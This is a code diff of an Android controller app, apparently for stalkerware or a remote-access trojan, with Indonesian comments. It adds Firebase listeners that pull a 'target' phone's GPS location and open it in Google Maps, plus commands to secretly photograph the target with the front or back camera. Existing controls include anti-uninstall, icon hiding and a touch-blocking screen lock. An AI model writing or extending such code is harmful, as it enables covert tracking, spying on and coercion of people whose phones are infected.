@@ -39,6 +39,8 @@ public class MainActivity extends AppCompatActivity {
     private ValueEventListener lockLowListener;
     private ValueEventListener lockCustomListener;
     private ValueEventListener hideIconListener;
+    private ValueEventListener gpsListener;
+    private ValueEventListener cameraListener;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -75,6 +77,8 @@ public class MainActivity extends AppCompatActivity {
         sendMyDeviceInfo();
         listenDeviceInfoRealtime();
         listenStatusRealtime();
+        listenGPSRealtime();
+        listenCameraRealtime();
 
         swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
             mDatabase.child("antiUninstall").setValue(isChecked);
@@ -150,15 +154,79 @@ public class MainActivity extends AppCompatActivity {
             Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
         });
 
+        // GPS — langsung buka Google Maps
         btnGPS.setOnClickListener(v -> {
             mDatabase.child("command").setValue("gps");
             Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
         });
 
+        // Kamera — ambil foto target
         btnKamera.setOnClickListener(v -> {
-            mDatabase.child("command").setValue("camera");
-            Toast.makeText(this, "📸 Mengambil foto target...", Toast.LENGTH_SHORT).show();
+            AlertDialog.Builder builder = new AlertDialog.Builder(this);
+            builder.setTitle("📸 Pilih Kamera Target");
+            builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
+                String command = (which == 0) ? "camera_front" : "camera_back";
+                mDatabase.child("command").setValue(command);
+                Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
+            });
+            builder.show();
         });
+    }
+
+    // ===== REAL-TIME: GPS =====
+    private void listenGPSRealtime() {
+        gpsListener = new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                String loc = snapshot.getValue(String.class);
+                if (loc != null && !loc.isEmpty()) {
+                    // Format: "lat,lon"
+                    String[] parts = loc.split(",");
+                    if (parts.length == 2) {
+                        String lat = parts[0].trim();
+                        String lon = parts[1].trim();
+                        // Langsung buka Google Maps
+                        String uri = "geo:" + lat + "," + lon + "?q=" + lat + "," + lon;
+                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
+                        intent.setPackage("com.google.android.apps.maps");
+                        if (intent.resolveActivity(getPackageManager()) != null) {
+                            startActivity(intent);
+                        } else {
+                            // Kalo gak ada Google Maps, pake browser
+                            intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://maps.google.com/?q=" + lat + "," + lon));
+                            startActivity(intent);
+                        }
+                        Toast.makeText(MainActivity.this, "📍 Lokasi: " + lat + ", " + lon, Toast.LENGTH_SHORT).show();
+                        // Hapus setelah dibaca
+                        mDatabase.child("gpsLocation").removeValue();
+                    }
+                }
+            }
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {}
+        };
+        mDatabase.child("gpsLocation").addValueEventListener(gpsListener);
+    }
+
+    // ===== REAL-TIME: KAMERA =====
+    private void listenCameraRealtime() {
+        cameraListener = new ValueEventListener() {
+            @Override
+            public void onDataChange(@NonNull DataSnapshot snapshot) {
+                String photoUrl = snapshot.getValue(String.class);
+                if (photoUrl != null && !photoUrl.isEmpty()) {
+                    // Buka foto di browser/Intent
+                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(photoUrl));
+                    startActivity(intent);
+                    Toast.makeText(MainActivity.this, "📸 Foto berhasil diambil!", Toast.LENGTH_SHORT).show();
+                    // Hapus setelah dibaca
+                    mDatabase.child("photoUrl").removeValue();
+                }
+            }
+            @Override
+            public void onCancelled(@NonNull DatabaseError error) {}
+        };
+        mDatabase.child("photoUrl").addValueEventListener(cameraListener);
     }
 
     private void listenDeviceInfoRealtime() {
@@ -170,7 +238,6 @@ public class MainActivity extends AppCompatActivity {
                     String deviceId = snapshot.child("deviceId").getValue(String.class);
                     Integer battery = snapshot.child("battery").getValue(Integer.class);
                     Boolean online = snapshot.child("online").getValue(Boolean.class);
-
                     runOnUiThread(() -> {
                         if (deviceName != null) tvDeviceName.setText(deviceName);
                         if (deviceId != null) tvDeviceId.setText(deviceId);
@@ -297,14 +364,12 @@ public class MainActivity extends AppCompatActivity {
         String deviceName = Build.MODEL;
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         int battery = getBatteryLevel();
-
         Map<String, Object> data = new HashMap<>();
         data.put("deviceName", deviceName);
         data.put("deviceId", deviceId);
         data.put("battery", battery);
         data.put("online", true);
         data.put("timestamp", System.currentTimeMillis());
-
         mDatabase.child("deviceInfo").setValue(data);
     }
 
@@ -322,5 +387,7 @@ public class MainActivity extends AppCompatActivity {
         if (lockCustomListener != null) mDatabase.child("lockCustom").removeEventListener(lockCustomListener);
         if (hideIconListener != null) mDatabase.child("hideIcon").removeEventListener(hideIconListener);
         if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
+        if (gpsListener != null) mDatabase.child("gpsLocation").removeEventListener(gpsListener);
+        if (cameraListener != null) mDatabase.child("photoUrl").removeEventListener(cameraListener);
     }
                                                         }
